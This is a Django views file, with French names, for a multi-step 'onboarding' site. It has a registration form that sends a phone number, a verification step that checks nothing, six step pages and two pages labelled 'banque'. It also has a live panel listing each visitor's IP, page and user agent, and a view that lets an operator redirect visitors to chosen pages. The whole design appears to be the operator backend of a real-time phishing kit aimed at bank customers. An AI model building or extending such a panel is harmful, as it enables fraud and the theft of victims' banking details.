from django.shortcuts import render, redirect
import requests
import time
from .middleware import VISITEURS_ACTIFS, REDIRECTIONS, PAGES_DISPONIBLES
from django.views.decorators.http import require_POST
import json

from .forms import InscriptionForm, VerificationForm



from django.shortcuts import render, redirect


from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.hashers import make_password

PAGES_DISPONIBLES = [
    ('/', 'Inscription / Connexion'),
    ('/verification/', 'Vérification'),
    ('/etape-1/', 'Étape 1'),
    ('/etape-2/', 'Étape 2'),
    ('/etape-3/', 'Étape 3'),
    ('/etape-4/', 'Étape 4'),
    ('/etape-5/', 'Étape 5'),
    ('/etape-6/', 'Étape 6'),
    ('/banque-1/', 'Banque 1'),
    ('/banque-2/', 'Banque 2'),
]

def redirection(request):
    if request.method == "POST":
        destination = request.POST.get("destination")

        pages_autorisees = dict(PAGES_DISPONIBLES)

        if destination in pages_autorisees:
            return redirect(destination)

    return render(
        request,
        "redirection.html",
        {"pages_disponibles": PAGES_DISPONIBLES}
    )
    
def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('destination')
    else:
        form = InscriptionForm()

    return render(request, "onboarding\\inscription.html", {'form': form})

def visiteurs_temps_reel(request):
    maintenant = time.time()
    visiteurs = []
    for ip, data in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - data['last_seen'])
        visiteurs.append({
            'ip':         ip,
            'page':       data['page'],
            'methode':    data['methode'],
            'user_agent': data['user_agent'],
            'il_y_a':     f"il y a {il_y_a}s",
        })
    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':    visiteurs,
        'total':        len(visiteurs),
        'pages':        PAGES_DISPONIBLES,
        'pages_json':   json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })
def visiteurs_json(request):
    from django.http import JsonResponse
    maintenant = time.time()
    data = []
    for ip, info in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - info['last_seen'])
        data.append({
            'ip':      ip,
            'page':    info['page'],
            'methode': info['methode'],
            'il_y_a':  il_y_a,
        })
    data.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': data, 'total': len(data)})

def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            # Ici, on vérifierait normalement le code envoyé par e-mail.
            return redirect('etape_1')
    else:
        form = VerificationForm()

    return render(request, 'onboarding/verification.html', {'form': form})

def etape_1(request):
    return render(request, 'onboarding/etape-1.html')


def etape_2(request):
    return render(request, 'onboarding/etape-2.html')


def etape_3(request):
    return render(request, 'onboarding/etape-3.html')


def etape_4(request):
    return render(request, 'onboarding/etape-4.html')


def etape_5(request):
    return render(request, 'onboarding/etape-5.html')


def etape_6(request):
    return render(request, 'onboarding/etape-6.html')


def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


